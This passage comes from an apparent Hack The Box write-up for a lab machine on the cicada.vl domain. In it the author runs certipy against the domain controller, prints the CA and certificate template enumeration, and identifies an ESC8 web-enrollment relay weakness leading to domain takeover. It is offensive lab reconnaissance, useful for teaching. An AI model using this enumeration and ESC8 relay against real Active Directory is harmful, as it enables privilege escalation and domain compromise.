+</span></span></span><span style=display:flex><span><span style=color:#e6db74>        e4:a8:4f:0f:f1:10:48:71:84:be:36:6c:f6:b2:41:77:6c:d4:
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>        16:58:f8:19:09:c4:46:a0:cf:46:cc:cf:82:7e:ca:fb:73:6e:
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>        43:b0:c6:a1
+</span></span></span></code></pre></div><p>Not seeing anything clearly helpful here.</p><p>Given the clear focus on certificates here, let&rsquo;s see if we can find any vulnerable certificate stuff with certipy.</p><pre tabindex=0><code>└──╼ $└──╼ $certipy find -k -no-pass -target DC-JPQ225.cicada.vl -dc-ip 10.129.29.26 -ns 10.129.29.26 -enabled
+Certipy v4.8.2 - by Oliver Lyak (ly4k)
+
+[*] Finding certificate templates
+[*] Found 33 certificate templates
+[*] Finding certificate authorities
+[*] Found 1 certificate authority
+[*] Found 11 enabled certificate templates
+[*] Trying to get CA configuration for &#39;cicada-DC-JPQ225-CA&#39; via CSRA
+[!] Got error while trying to get CA configuration for &#39;cicada-DC-JPQ225-CA&#39; via CSRA: CASessionError: code: 0x80070005 - E_ACCESSDENIED - General access denied error.
+[*] Trying to get CA configuration for &#39;cicada-DC-JPQ225-CA&#39; via RRP
+[!] Failed to connect to remote registry. Service should be starting now. Trying again...
+[*] Got CA configuration for &#39;cicada-DC-JPQ225-CA&#39;
+[*] Saved BloodHound data to &#39;20250703135136_Certipy.zip&#39;. Drag and drop the file into the BloodHound GUI from @ly4k
+[*] Saved text output to &#39;20250703135136_Certipy.txt&#39;
+[*] Saved JSON output to &#39;20250703135136_Certipy.json&#39;
+(htb) ┌─[chasepd@THE-HACKINATOR]─[~/htb/vulncicada]
+└──╼ $cat 20250703135136_Certipy.json 
+{
+  &#34;Certificate Authorities&#34;: {
+    &#34;0&#34;: {
+      &#34;CA Name&#34;: &#34;cicada-DC-JPQ225-CA&#34;,
+      &#34;DNS Name&#34;: &#34;DC-JPQ225.cicada.vl&#34;,
+      &#34;Certificate Subject&#34;: &#34;CN=cicada-DC-JPQ225-CA, DC=cicada, DC=vl&#34;,
+      &#34;Certificate Serial Number&#34;: &#34;162375BBBB4CE5B04887BCBBC087DDD1&#34;,
+      &#34;Certificate Validity Start&#34;: &#34;2025-07-03 16:19:28+00:00&#34;,
+      &#34;Certificate Validity End&#34;: &#34;2525-07-03 16:29:28+00:00&#34;,
+      &#34;Web Enrollment&#34;: &#34;Enabled&#34;,
+      &#34;User Specified SAN&#34;: &#34;Disabled&#34;,
+      &#34;Request Disposition&#34;: &#34;Issue&#34;,
+      &#34;Enforce Encryption for Requests&#34;: &#34;Enabled&#34;,
+      &#34;Permissions&#34;: {
+        &#34;Owner&#34;: &#34;CICADA.VL\\Administrators&#34;,
+        &#34;Access Rights&#34;: {
+          &#34;2&#34;: [
+            &#34;CICADA.VL\\Administrators&#34;,
+            &#34;CICADA.VL\\Domain Admins&#34;,
+            &#34;CICADA.VL\\Enterprise Admins&#34;
+          ],
+          &#34;1&#34;: [
+            &#34;CICADA.VL\\Administrators&#34;,
+            &#34;CICADA.VL\\Domain Admins&#34;,
+            &#34;CICADA.VL\\Enterprise Admins&#34;
+          ],
+          &#34;512&#34;: [
+            &#34;CICADA.VL\\Authenticated Users&#34;
+          ]
+        }
+      },
+      &#34;[!] Vulnerabilities&#34;: {
+        &#34;ESC8&#34;: &#34;Web Enrollment is enabled and Request Disposition is set to Issue&#34;
+      }
+    }
+  },
+  &#34;Certificate Templates&#34;: {
+    &#34;0&#34;: {
+      &#34;Template Name&#34;: &#34;KerberosAuthentication&#34;,
+      &#34;Display Name&#34;: &#34;Kerberos Authentication&#34;,
+      &#34;Certificate Authorities&#34;: [
+        &#34;cicada-DC-JPQ225-CA&#34;
+      ],
+      &#34;Enabled&#34;: true,
+      &#34;Client Authentication&#34;: true,
+      &#34;Enrollment Agent&#34;: false,
+      &#34;Any Purpose&#34;: false,
+      &#34;Enrollee Supplies Subject&#34;: false,
+      &#34;Certificate Name Flag&#34;: [
+        &#34;SubjectAltRequireDns&#34;,
+        &#34;SubjectAltRequireDomainDns&#34;
+      ],
+      &#34;Enrollment Flag&#34;: [
+        &#34;AutoEnrollment&#34;
+      ],
+      &#34;Private Key Flag&#34;: [
+        &#34;AttestNone&#34;
+      ],
+      &#34;Extended Key Usage&#34;: [
+        &#34;Client Authentication&#34;,
+        &#34;Server Authentication&#34;,
+        &#34;Smart Card Logon&#34;,
+        &#34;KDC Authentication&#34;
+      ],
+      &#34;Requires Manager Approval&#34;: false,
+      &#34;Requires Key Archival&#34;: false,
+      &#34;Authorized Signatures Required&#34;: 0,
+      &#34;Validity Period&#34;: &#34;1 year&#34;,
+      &#34;Renewal Period&#34;: &#34;6 weeks&#34;,
+      &#34;Minimum RSA Key Length&#34;: 2048,
+      &#34;Permissions&#34;: {
+        &#34;Enrollment Permissions&#34;: {
+          &#34;Enrollment Rights&#34;: [
+            &#34;CICADA.VL\\Enterprise Read-only Domain Controllers&#34;,
+            &#34;CICADA.VL\\Domain Admins&#34;,
+            &#34;CICADA.VL\\Domain Controllers&#34;,
+            &#34;CICADA.VL\\Enterprise Admins&#34;,
+            &#34;CICADA.VL\\Enterprise Domain Controllers&#34;
+          ]
+        },
+        &#34;Object Control Permissions&#34;: {
+          &#34;Owner&#34;: &#34;CICADA.VL\\Enterprise Admins&#34;,
+          &#34;Write Owner Principals&#34;: [
+            &#34;CICADA.VL\\Domain Admins&#34;,
+            &#34;CICADA.VL\\Enterprise Admins&#34;
+          ],
+          &#34;Write Dacl Principals&#34;: [
+            &#34;CICADA.VL\\Domain Admins&#34;,
+            &#34;CICADA.VL\\Enterprise Admins&#34;
+          ],
+          &#34;Write Property Principals&#34;: [
+            &#34;CICADA.VL\\Domain Admins&#34;,
+            &#34;CICADA.VL\\Enterprise Admins&#34;
+          ]
+        }
+      }
+    },
+    &#34;1&#34;: {
+      &#34;Template Name&#34;: &#34;DirectoryEmailReplication&#34;,
+      &#34;Display Name&#34;: &#34;Directory Email Replication&#34;,
+      &#34;Certificate Authorities&#34;: [
+        &#34;cicada-DC-JPQ225-CA&#34;
+      ],
+      &#34;Enabled&#34;: true,
+      &#34;Client Authentication&#34;: false,
+      &#34;Enrollment Agent&#34;: false,
+      &#34;Any Purpose&#34;: false,
+      &#34;Enrollee Supplies Subject&#34;: false,
+      &#34;Certificate Name Flag&#34;: [
+        &#34;SubjectAltRequireDns&#34;,
+        &#34;SubjectAltRequireDirectoryGuid&#34;
+      ],
+      &#34;Enrollment Flag&#34;: [
+        &#34;AutoEnrollment&#34;,
+        &#34;PublishToDs&#34;,
+        &#34;IncludeSymmetricAlgorithms&#34;
+      ],
+      &#34;Private Key Flag&#34;: [
+        &#34;AttestNone&#34;
+      ],
+      &#34;Extended Key Usage&#34;: [
+        &#34;Directory Service Email Replication&#34;
+      ],
+      &#34;Requires Manager Approval&#34;: false,
+      &#34;Requires Key Archival&#34;: false,
+      &#34;Authorized Signatures Required&#34;: 0,
+      &#34;Validity Period&#34;: &#34;1 year&#34;,
+      &#34;Renewal Period&#34;: &#34;6 weeks&#34;,
+      &#34;Minimum RSA Key Length&#34;: 2048,
+      &#34;Permissions&#34;: {
+        &#34;Enrollment Permissions&#34;: {
+          &#34;Enrollment Rights&#34;: [
+            &#34;CICADA.VL\\Enterprise Read-only Domain Controllers&#34;,
+            &#34;CICADA.VL\\Domain Admins&#34;,
+            &#34;CICADA.VL\\Domain Controllers&#34;,
+            &#34;CICADA.VL\\Enterprise Admins&#34;,
+            &#34;CICADA.VL\\Enterprise Domain Controllers&#34;
+          ]
+        },
+        &#34;Object Control Permissions&#34;: {
+          &#34;Owner&#34;: &#34;CICADA.VL\\Enterprise Admins&#34;,
+          &#34;Write Owner Principals&#34;: [
+            &#34;CICADA.VL\\Domain Admins&#34;,
+            &#34;CICADA.VL\\Enterprise Admins&#34;
+          ],
+          &#34;Write Dacl Principals&#34;: [
+            &#34;CICADA.VL\\Domain Admins&#34;,
+            &#34;CICADA.VL\\Enterprise Admins&#34;
+          ],
+          &#34;Write Property Principals&#34;: [
+            &#34;CICADA.VL\\Domain Admins&#34;,
+            &#34;CICADA.VL\\Enterprise Admins&#34;
+          ]
+        }
+      }
+    },
+    &#34;2&#34;: {
+      &#34;Template Name&#34;: &#34;DomainControllerAuthentication&#34;,
+      &#34;Display Name&#34;: &#34;Domain Controller Authentication&#34;,
+      &#34;Certificate Authorities&#34;: [
+        &#34;cicada-DC-JPQ225-CA&#34;
+      ],
+      &#34;Enabled&#34;: true,
+      &#34;Client Authentication&#34;: true,
+      &#34;Enrollment Agent&#34;: false,
+      &#34;Any Purpose&#34;: false,
+      &#34;Enrollee Supplies Subject&#34;: false,
+      &#34;Certificate Name Flag&#34;: [
+        &#34;SubjectAltRequireDns&#34;
+      ],
+      &#34;Enrollment Flag&#34;: [
+        &#34;AutoEnrollment&#34;
+      ],
+      &#34;Private Key Flag&#34;: [
+        &#34;AttestNone&#34;
+      ],
+      &#34;Extended Key Usage&#34;: [
+        &#34;Client Authentication&#34;,
+        &#34;Server Authentication&#34;,
+        &#34;Smart Card Logon&#34;
+      ],
+      &#34;Requires Manager Approval&#34;: false,
+      &#34;Requires Key Archival&#34;: false,
+      &#34;Authorized Signatures Required&#34;: 0,
+      &#34;Validity Period&#34;: &#34;1 year&#34;,
+      &#34;Renewal Period&#34;: &#34;6 weeks&#34;,
+      &#34;Minimum RSA Key Length&#34;: 2048,
+      &#34;Permissions&#34;: {
+        &#34;Enrollment Permissions&#34;: {
+          &#34;Enrollment Rights&#34;: [
+            &#34;CICADA.VL\\Enterprise Read-only Domain Controllers&#34;,
+            &#34;CICADA.VL\\Domain Admins&#34;,
+            &#34;CICADA.VL\\Domain Controllers&#34;,
+            &#34;CICADA.VL\\Enterprise Admins&#34;,
+            &#34;CICADA.VL\\Enterprise Domain Controllers&#34;
+          ]
+        },
+        &#34;Object Control Permissions&#34;: {
+          &#34;Owner&#34;: &#34;CICADA.VL\\Enterprise Admins&#34;,
+          &#34;Write Owner Principals&#34;: [
+            &#34;CICADA.VL\\Domain Admins&#34;,
+            &#34;CICADA.VL\\Enterprise Admins&#34;
+          ],
+          &#34;Write Dacl Principals&#34;: [
+            &#34;CICADA.VL\\Domain Admins&#34;,
+            &#34;CICADA.VL\\Enterprise Admins&#34;
+          ],
+          &#34;Write Property Principals&#34;: [
+            &#34;CICADA.VL\\Domain Admins&#34;,
+            &#34;CICADA.VL\\Enterprise Admins&#34;
+          ]
+        }
+      }
+    },
+    &#34;3&#34;: {
+      &#34;Template Name&#34;: &#34;SubCA&#34;,
+      &#34;Display Name&#34;: &#34;Subordinate Certification Authority&#34;,
+      &#34;Certificate Authorities&#34;: [
+        &#34;cicada-DC-JPQ225-CA&#34;
+      ],
+      &#34;Enabled&#34;: true,
+      &#34;Client Authentication&#34;: true,
+      &#34;Enrollment Agent&#34;: true,
+      &#34;Any Purpose&#34;: true,
+      &#34;Enrollee Supplies Subject&#34;: true,
+      &#34;Certificate Name Flag&#34;: [
+        &#34;EnrolleeSuppliesSubject&#34;
+      ],
+      &#34;Enrollment Flag&#34;: [
+        &#34;None&#34;
+      ],
+      &#34;Private Key Flag&#34;: [
+        &#34;ExportableKey&#34;
+      ],
+      &#34;Requires Manager Approval&#34;: false,
+      &#34;Requires Key Archival&#34;: false,
+      &#34;Authorized Signatures Required&#34;: 0,
+      &#34;Validity Period&#34;: &#34;5 years&#34;,
+      &#34;Renewal Period&#34;: &#34;6 weeks&#34;,
+      &#34;Minimum RSA Key Length&#34;: 2048,
+      &#34;Permissions&#34;: {
+        &#34;Enrollment Permissions&#34;: {
+          &#34;Enrollment Rights&#34;: [
+            &#34;CICADA.VL\\Domain Admins&#34;,
+            &#34;CICADA.VL\\Enterprise Admins&#34;
+          ]
+        },
+        &#34;Object Control Permissions&#34;: {
+          &#34;Owner&#34;: &#34;CICADA.VL\\Enterprise Admins&#34;,
+          &#34;Write Owner Principals&#34;: [
+            &#34;CICADA.VL\\Domain Admins&#34;,
+            &#34;CICADA.VL\\Enterprise Admins&#34;
+          ],
+          &#34;Write Dacl Principals&#34;: [
+            &#34;CICADA.VL\\Domain Admins&#34;,
+            &#34;CICADA.VL\\Enterprise Admins&#34;
+          ],
+          &#34;Write Property Principals&#34;: [
+            &#34;CICADA.VL\\Domain Admins&#34;,
+            &#34;CICADA.VL\\Enterprise Admins&#34;
+          ]
+        }
+      }
+    },
+    &#34;4&#34;: {
+      &#34;Template Name&#34;: &#34;WebServer&#34;,
+      &#34;Display Name&#34;: &#34;Web Server&#34;,
+      &#34;Certificate Authorities&#34;: [
+        &#34;cicada-DC-JPQ225-CA&#34;
+      ],
+      &#34;Enabled&#34;: true,
+      &#34;Client Authentication&#34;: false,
+      &#34;Enrollment Agent&#34;: false,
+      &#34;Any Purpose&#34;: false,
+      &#34;Enrollee Supplies Subject&#34;: true,
+      &#34;Certificate Name Flag&#34;: [
+        &#34;EnrolleeSuppliesSubject&#34;
+      ],
+      &#34;Enrollment Flag&#34;: [
+        &#34;None&#34;
+      ],
+      &#34;Private Key Flag&#34;: [
+        &#34;AttestNone&#34;
+      ],
+      &#34;Extended Key Usage&#34;: [
+        &#34;Server Authentication&#34;
+      ],
+      &#34;Requires Manager Approval&#34;: false,
+      &#34;Requires Key Archival&#34;: false,
+      &#34;Authorized Signatures Required&#34;: 0,
+      &#34;Validity Period&#34;: &#34;2 years&#34;,
+      &#34;Renewal Period&#34;: &#34;6 weeks&#34;,
+      &#34;Minimum RSA Key Length&#34;: 2048,
+      &#34;Permissions&#34;: {
+        &#34;Enrollment Permissions&#34;: {
+          &#34;Enrollment Rights&#34;: [
+            &#34;CICADA.VL\\Domain Admins&#34;,
+            &#34;CICADA.VL\\Enterprise Admins&#34;
+          ]
+        },
+        &#34;Object Control Permissions&#34;: {
+          &#34;Owner&#34;: &#34;CICADA.VL\\Enterprise Admins&#34;,
+          &#34;Write Owner Principals&#34;: [
+            &#34;CICADA.VL\\Domain Admins&#34;,
+            &#34;CICADA.VL\\Enterprise Admins&#34;
+          ],
+          &#34;Write Dacl Principals&#34;: [
+            &#34;CICADA.VL\\Domain Admins&#34;,
+            &#34;CICADA.VL\\Enterprise Admins&#34;
+          ],
+          &#34;Write Property Principals&#34;: [
+            &#34;CICADA.VL\\Domain Admins&#34;,
+            &#34;CICADA.VL\\Enterprise Admins&#34;
+          ]
+        }
+      }
+    },
+    &#34;5&#34;: {
+      &#34;Template Name&#34;: &#34;DomainController&#34;,
+      &#34;Display Name&#34;: &#34;Domain Controller&#34;,
+      &#34;Certificate Authorities&#34;: [
+        &#34;cicada-DC-JPQ225-CA&#34;
+      ],
+      &#34;Enabled&#34;: true,
+      &#34;Client Authentication&#34;: true,
+      &#34;Enrollment Agent&#34;: false,
+      &#34;Any Purpose&#34;: false,
+      &#34;Enrollee Supplies Subject&#34;: false,
+      &#34;Certificate Name Flag&#34;: [
+        &#34;SubjectRequireDnsAsCn&#34;,
+        &#34;SubjectAltRequireDns&#34;,
+        &#34;SubjectAltRequireDirectoryGuid&#34;
+      ],
+      &#34;Enrollment Flag&#34;: [
+        &#34;AutoEnrollment&#34;,
+        &#34;PublishToDs&#34;,
+        &#34;IncludeSymmetricAlgorithms&#34;
+      ],
+      &#34;Private Key Flag&#34;: [
+        &#34;AttestNone&#34;
+      ],
+      &#34;Extended Key Usage&#34;: [
+        &#34;Client Authentication&#34;,
+        &#34;Server Authentication&#34;
+      ],
+      &#34;Requires Manager Approval&#34;: false,
+      &#34;Requires Key Archival&#34;: false,
+      &#34;Authorized Signatures Required&#34;: 0,
+      &#34;Validity Period&#34;: &#34;1 year&#34;,
+      &#34;Renewal Period&#34;: &#34;6 weeks&#34;,
+      &#34;Minimum RSA Key Length&#34;: 2048,
+      &#34;Permissions&#34;: {
+        &#34;Enrollment Permissions&#34;: {
+          &#34;Enrollment Rights&#34;: [
+            &#34;CICADA.VL\\Enterprise Read-only Domain Controllers&#34;,
+            &#34;CICADA.VL\\Domain Admins&#34;,
+            &#34;CICADA.VL\\Domain Controllers&#34;,
+            &#34;CICADA.VL\\Enterprise Admins&#34;,
+            &#34;CICADA.VL\\Enterprise Domain Controllers&#34;
+          ]
+        },
+        &#34;Object Control Permissions&#34;: {
+          &#34;Owner&#34;: &#34;CICADA.VL\\Enterprise Admins&#34;,
+          &#34;Write Owner Principals&#34;: [
+            &#34;CICADA.VL\\Domain Admins&#34;,
+            &#34;CICADA.VL\\Enterprise Admins&#34;
+          ],
+          &#34;Write Dacl Principals&#34;: [
+            &#34;CICADA.VL\\Domain Admins&#34;,
+            &#34;CICADA.VL\\Enterprise Admins&#34;
+          ],
+          &#34;Write Property Principals&#34;: [
+            &#34;CICADA.VL\\Domain Admins&#34;,
+            &#34;CICADA.VL\\Enterprise Admins&#34;
+          ]
+        }
+      }
+    },
+    &#34;6&#34;: {
+      &#34;Template Name&#34;: &#34;Machine&#34;,
+      &#34;Display Name&#34;: &#34;Computer&#34;,
+      &#34;Certificate Authorities&#34;: [
+        &#34;cicada-DC-JPQ225-CA&#34;
+      ],
+      &#34;Enabled&#34;: true,
+      &#34;Client Authentication&#34;: true,
+      &#34;Enrollment Agent&#34;: false,
+      &#34;Any Purpose&#34;: false,
+      &#34;Enrollee Supplies Subject&#34;: false,
+      &#34;Certificate Name Flag&#34;: [
+        &#34;SubjectRequireDnsAsCn&#34;,
+        &#34;SubjectAltRequireDns&#34;
+      ],
+      &#34;Enrollment Flag&#34;: [
+        &#34;AutoEnrollment&#34;
+      ],
+      &#34;Private Key Flag&#34;: [
+        &#34;AttestNone&#34;
+      ],
+      &#34;Extended Key Usage&#34;: [
+        &#34;Client Authentication&#34;,
+        &#34;Server Authentication&#34;
+      ],
+      &#34;Requires Manager Approval&#34;: false,
+      &#34;Requires Key Archival&#34;: false,
+      &#34;Authorized Signatures Required&#34;: 0,
+      &#34;Validity Period&#34;: &#34;1 year&#34;,
+      &#34;Renewal Period&#34;: &#34;6 weeks&#34;,
+      &#34;Minimum RSA Key Length&#34;: 2048,
+      &#34;Permissions&#34;: {
+        &#34;Enrollment Permissions&#34;: {
+          &#34;Enrollment Rights&#34;: [
+            &#34;CICADA.VL\\Domain Admins&#34;,
+            &#34;CICADA.VL\\Domain Computers&#34;,
+            &#34;CICADA.VL\\Enterprise Admins&#34;
+          ]
+        },
+        &#34;Object Control Permissions&#34;: {
+          &#34;Owner&#34;: &#34;CICADA.VL\\Enterprise Admins&#34;,
+          &#34;Write Owner Principals&#34;: [
+            &#34;CICADA.VL\\Domain Admins&#34;,
+            &#34;CICADA.VL\\Enterprise Admins&#34;
+          ],
+          &#34;Write Dacl Principals&#34;: [
+            &#34;CICADA.VL\\Domain Admins&#34;,
+            &#34;CICADA.VL\\Enterprise Admins&#34;
+          ],
+          &#34;Write Property Principals&#34;: [
+            &#34;CICADA.VL\\Domain Admins&#34;,
+            &#34;CICADA.VL\\Enterprise Admins&#34;
+          ]
+        }
+      }
+    },
+    &#34;7&#34;: {
+      &#34;Template Name&#34;: &#34;EFSRecovery&#34;,
+      &#34;Display Name&#34;: &#34;EFS Recovery Agent&#34;,
+      &#34;Certificate Authorities&#34;: [
+        &#34;cicada-DC-JPQ225-CA&#34;
+      ],
+      &#34;Enabled&#34;: true,
+      &#34;Client Authentication&#34;: false,
+      &#34;Enrollment Agent&#34;: false,
+      &#34;Any Purpose&#34;: false,
+      &#34;Enrollee Supplies Subject&#34;: false,
+      &#34;Certificate Name Flag&#34;: [
+        &#34;SubjectRequireDirectoryPath&#34;,
+        &#34;SubjectAltRequireUpn&#34;
+      ],
+      &#34;Enrollment Flag&#34;: [
+        &#34;AutoEnrollment&#34;,
+        &#34;IncludeSymmetricAlgorithms&#34;
+      ],
+      &#34;Private Key Flag&#34;: [
+        &#34;ExportableKey&#34;
+      ],
+      &#34;Extended Key Usage&#34;: [
+        &#34;File Recovery&#34;
+      ],
+      &#34;Requires Manager Approval&#34;: false,
+      &#34;Requires Key Archival&#34;: false,
+      &#34;Authorized Signatures Required&#34;: 0,
+      &#34;Validity Period&#34;: &#34;5 years&#34;,
+      &#34;Renewal Period&#34;: &#34;6 weeks&#34;,
+      &#34;Minimum RSA Key Length&#34;: 2048,
+      &#34;Permissions&#34;: {
+        &#34;Enrollment Permissions&#34;: {
+          &#34;Enrollment Rights&#34;: [
+            &#34;CICADA.VL\\Domain Admins&#34;,
+            &#34;CICADA.VL\\Enterprise Admins&#34;
+          ]
+        },
+        &#34;Object Control Permissions&#34;: {
+          &#34;Owner&#34;: &#34;CICADA.VL\\Enterprise Admins&#34;,
+          &#34;Write Owner Principals&#34;: [
+            &#34;CICADA.VL\\Domain Admins&#34;,
+            &#34;CICADA.VL\\Enterprise Admins&#34;
+          ],
+          &#34;Write Dacl Principals&#34;: [
+            &#34;CICADA.VL\\Domain Admins&#34;,
+            &#34;CICADA.VL\\Enterprise Admins&#34;
+          ],
+          &#34;Write Property Principals&#34;: [
+            &#34;CICADA.VL\\Domain Admins&#34;,
+            &#34;CICADA.VL\\Enterprise Admins&#34;
+          ]
+        }
+      }
+    },
+    &#34;8&#34;: {
+      &#34;Template Name&#34;: &#34;Administrator&#34;,
+      &#34;Display Name&#34;: &#34;Administrator&#34;,
+      &#34;Certificate Authorities&#34;: [
+        &#34;cicada-DC-JPQ225-CA&#34;
+      ],
+      &#34;Enabled&#34;: true,
+      &#34;Client Authentication&#34;: true,
+      &#34;Enrollment Agent&#34;: false,
+      &#34;Any Purpose&#34;: false,
+      &#34;Enrollee Supplies Subject&#34;: false,
+      &#34;Certificate Name Flag&#34;: [
+        &#34;SubjectRequireDirectoryPath&#34;,
+        &#34;SubjectRequireEmail&#34;,
+        &#34;SubjectAltRequireEmail&#34;,
+        &#34;SubjectAltRequireUpn&#34;
+      ],
+      &#34;Enrollment Flag&#34;: [
+        &#34;AutoEnrollment&#34;,
+        &#34;PublishToDs&#34;,
+        &#34;IncludeSymmetricAlgorithms&#34;
+      ],
+      &#34;Private Key Flag&#34;: [
+        &#34;ExportableKey&#34;
+      ],
+      &#34;Extended Key Usage&#34;: [
+        &#34;Microsoft Trust List Signing&#34;,
+        &#34;Encrypting File System&#34;,
+        &#34;Secure Email&#34;,
+        &#34;Client Authentication&#34;
+      ],
+      &#34;Requires Manager Approval&#34;: false,
+      &#34;Requires Key Archival&#34;: false,
+      &#34;Authorized Signatures Required&#34;: 0,
+      &#34;Validity Period&#34;: &#34;1 year&#34;,
+      &#34;Renewal Period&#34;: &#34;6 weeks&#34;,
+      &#34;Minimum RSA Key Length&#34;: 2048,
+      &#34;Permissions&#34;: {
+        &#34;Enrollment Permissions&#34;: {
+          &#34;Enrollment Rights&#34;: [
+            &#34;CICADA.VL\\Domain Admins&#34;,
+            &#34;CICADA.VL\\Enterprise Admins&#34;
+          ]
+        },
+        &#34;Object Control Permissions&#34;: {
+          &#34;Owner&#34;: &#34;CICADA.VL\\Enterprise Admins&#34;,
+          &#34;Write Owner Principals&#34;: [
+            &#34;CICADA.VL\\Domain Admins&#34;,
+            &#34;CICADA.VL\\Enterprise Admins&#34;
+          ],
+          &#34;Write Dacl Principals&#34;: [
+            &#34;CICADA.VL\\Domain Admins&#34;,
+            &#34;CICADA.VL\\Enterprise Admins&#34;
+          ],
+          &#34;Write Property Principals&#34;: [
+            &#34;CICADA.VL\\Domain Admins&#34;,
+            &#34;CICADA.VL\\Enterprise Admins&#34;
+          ]
+        }
+      }
+    },
+    &#34;9&#34;: {
+      &#34;Template Name&#34;: &#34;EFS&#34;,
+      &#34;Display Name&#34;: &#34;Basic EFS&#34;,
+      &#34;Certificate Authorities&#34;: [
+        &#34;cicada-DC-JPQ225-CA&#34;
+      ],
+      &#34;Enabled&#34;: true,
+      &#34;Client Authentication&#34;: false,
+      &#34;Enrollment Agent&#34;: false,
+      &#34;Any Purpose&#34;: false,
+      &#34;Enrollee Supplies Subject&#34;: false,
+      &#34;Certificate Name Flag&#34;: [
+        &#34;SubjectRequireDirectoryPath&#34;,
+        &#34;SubjectAltRequireUpn&#34;
+      ],
+      &#34;Enrollment Flag&#34;: [
+        &#34;AutoEnrollment&#34;,
+        &#34;PublishToDs&#34;,
+        &#34;IncludeSymmetricAlgorithms&#34;
+      ],
+      &#34;Private Key Flag&#34;: [
+        &#34;ExportableKey&#34;
+      ],
+      &#34;Extended Key Usage&#34;: [
+        &#34;Encrypting File System&#34;
+      ],
+      &#34;Requires Manager Approval&#34;: false,
+      &#34;Requires Key Archival&#34;: false,
+      &#34;Authorized Signatures Required&#34;: 0,
+      &#34;Validity Period&#34;: &#34;1 year&#34;,
+      &#34;Renewal Period&#34;: &#34;6 weeks&#34;,
+      &#34;Minimum RSA Key Length&#34;: 2048,
+      &#34;Permissions&#34;: {
+        &#34;Enrollment Permissions&#34;: {
+          &#34;Enrollment Rights&#34;: [
+            &#34;CICADA.VL\\Domain Admins&#34;,
+            &#34;CICADA.VL\\Domain Users&#34;,
+            &#34;CICADA.VL\\Enterprise Admins&#34;
+          ]
+        },
+        &#34;Object Control Permissions&#34;: {
+          &#34;Owner&#34;: &#34;CICADA.VL\\Enterprise Admins&#34;,
+          &#34;Write Owner Principals&#34;: [
+            &#34;CICADA.VL\\Domain Admins&#34;,
+            &#34;CICADA.VL\\Enterprise Admins&#34;
+          ],
+          &#34;Write Dacl Principals&#34;: [
+            &#34;CICADA.VL\\Domain Admins&#34;,
+            &#34;CICADA.VL\\Enterprise Admins&#34;
+          ],
+          &#34;Write Property Principals&#34;: [
+            &#34;CICADA.VL\\Domain Admins&#34;,
+            &#34;CICADA.VL\\Enterprise Admins&#34;
+          ]
+        }
+      }
+    },
+    &#34;10&#34;: {
+      &#34;Template Name&#34;: &#34;User&#34;,
+      &#34;Display Name&#34;: &#34;User&#34;,
+      &#34;Certificate Authorities&#34;: [
+        &#34;cicada-DC-JPQ225-CA&#34;
+      ],
+      &#34;Enabled&#34;: true,
+      &#34;Client Authentication&#34;: true,
+      &#34;Enrollment Agent&#34;: false,
+      &#34;Any Purpose&#34;: false,
+      &#34;Enrollee Supplies Subject&#34;: false,
+      &#34;Certificate Name Flag&#34;: [
+        &#34;SubjectRequireDirectoryPath&#34;,
+        &#34;SubjectRequireEmail&#34;,
+        &#34;SubjectAltRequireEmail&#34;,
+        &#34;SubjectAltRequireUpn&#34;
+      ],
+      &#34;Enrollment Flag&#34;: [
+        &#34;AutoEnrollment&#34;,
+        &#34;PublishToDs&#34;,
+        &#34;IncludeSymmetricAlgorithms&#34;
+      ],
+      &#34;Private Key Flag&#34;: [
+        &#34;ExportableKey&#34;
+      ],
+      &#34;Extended Key Usage&#34;: [
+        &#34;Encrypting File System&#34;,
+        &#34;Secure Email&#34;,
+        &#34;Client Authentication&#34;
+      ],
+      &#34;Requires Manager Approval&#34;: false,
+      &#34;Requires Key Archival&#34;: false,
+      &#34;Authorized Signatures Required&#34;: 0,
+      &#34;Validity Period&#34;: &#34;1 year&#34;,
+      &#34;Renewal Period&#34;: &#34;6 weeks&#34;,
+      &#34;Minimum RSA Key Length&#34;: 2048,
+      &#34;Permissions&#34;: {
+        &#34;Enrollment Permissions&#34;: {
+          &#34;Enrollment Rights&#34;: [
+            &#34;CICADA.VL\\Domain Admins&#34;,
+            &#34;CICADA.VL\\Domain Users&#34;,
+            &#34;CICADA.VL\\Enterprise Admins&#34;
+          ]
+        },
+        &#34;Object Control Permissions&#34;: {
+          &#34;Owner&#34;: &#34;CICADA.VL\\Enterprise Admins&#34;,
+          &#34;Write Owner Principals&#34;: [
+            &#34;CICADA.VL\\Domain Admins&#34;,
+            &#34;CICADA.VL\\Enterprise Admins&#34;
+          ],
+          &#34;Write Dacl Principals&#34;: [
+            &#34;CICADA.VL\\Domain Admins&#34;,
+            &#34;CICADA.VL\\Enterprise Admins&#34;
+          ],
+          &#34;Write Property Principals&#34;: [
+            &#34;CICADA.VL\\Domain Admins&#34;,
+            &#34;CICADA.VL\\Enterprise Admins&#34;
+          ]
+        }
+      }
+    }
+  }
+}
+</code></pre><p>This is an ESC8 vulnerability! Web Enrollment is enabled, Request Disposition is set to Issue (i.e. the CA automatically issues certificates without requiring approval), any authenticated user can enroll (<em><strong>glances at Rosie.Powell</strong></em>
+<img src=/emojis/eyebrows.gif alt=eyebrows class="inline-emoji no-lightbox-emoji"><style>.inline-emoji.no-lightbox-emoji{height:1em;width:auto;vertical-align:-.15em;display:inline-block;margin:0 .08em;background:0 0!important;box-shadow:none!important;border:none!important;padding:0!important}body .inline-emoji.no-lightbox-emoji,body .post-content .inline-emoji.no-lightbox-emoji,body .about-content .inline-emoji.no-lightbox-emoji,body figure .inline-emoji.no-lightbox-emoji{background:0 0!important;box-shadow:none!important;border:none!important;padding:0!important;max-width:none!important}</style>), and there are no certificate template restrictions.</p><div style="display:flex;align-items:center;background:#e3f1ff;color:#1565c0;border-radius:10px;padding:1.2em 1.5em;margin:1.5em 0;font-size:1.1em;box-shadow:0 6px 18px rgba(0,0,0,.22),0 2px 6px rgba(0,0,0,.12);border:2px solid #2196f3;font-family:inter,segoe ui,roboto,helvetica neue,Arial,sans-serif;line-height:1.6"><span style=flex-shrink:0;font-size:1.7em;margin-right:.8em;display:flex;align-items:center;justify-content:center>ℹ️</span><div style=font-weight:500;width:100%>An ESC8 vulnerability is a class of privilege escalation vulnerability that allows a malicious domain user (or compromised domain user) to force a victim machine to authenticate to an attacker controlled one, then relaying the authentication to the vulnerable ADCS web enrollment server to request a certificate. From the <a href=https://learn.microsoft.com/en-us/defender-for-identity/security-assessment-insecure-adcs-certificate-enrollment>Microsoft documentation about this</a>, it says that this can lead to &ldquo;full domain takeover&rdquo;. I like the sound of that.</div></div><p>Searching for this vulnerability, 